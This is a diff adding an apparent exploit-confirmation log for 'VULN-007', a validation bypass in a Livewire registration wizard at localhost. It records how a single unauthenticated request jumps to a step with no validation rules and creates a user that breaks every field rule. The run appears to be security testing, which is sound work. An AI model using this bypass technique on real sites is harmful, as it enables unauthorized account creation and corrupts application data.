@@ -1,0 +1,19 @@
+========================================================================
+VULN-007: Registration step-scoped validation bypass
+target: http://localhost:20000
+[INFO] exercising vulnerable code path: RegistrationWizard::register -> validateCurrentStep (review step = no rules)
+========================================================================
+[STEP] GET /register (unauthenticated) to obtain a valid wizard snapshot
+[INFO] got RegistrationWizard snapshot (checksum will be re-verified server-side)
+[INFO] crafted invalid registration: email=bypass_fdcc2e0b@example.invalid password='1' gender=9 idnumber=25chars address=<empty>
+[STEP] POST one Livewire update: currentStep=4 (contacts step, empty array = vacuous rules) + invalid user_data + call register()
+[INFO] Livewire endpoint returned HTTP 200
+[STEP] querying the app DB to confirm the invalid User+Student were created
+USER_ID=2
+PW_IS_1=yes
+GENDER=9
+IDNUM_LEN=25
+ADDRESS=[]
+[PROOF] User 2 created with password='1' (Hash::check ok), gender_id=9 (in:0,1,2 forbids), idnumber length=25 (max:12 forbids) — every step rule was skipped
+[OK] exploit confirmed — unauthenticated request bypassed all registration validation
+==> VULN-007: CONFIRMED — one unauth Livewire request creates a User+Student violating every wizard rule
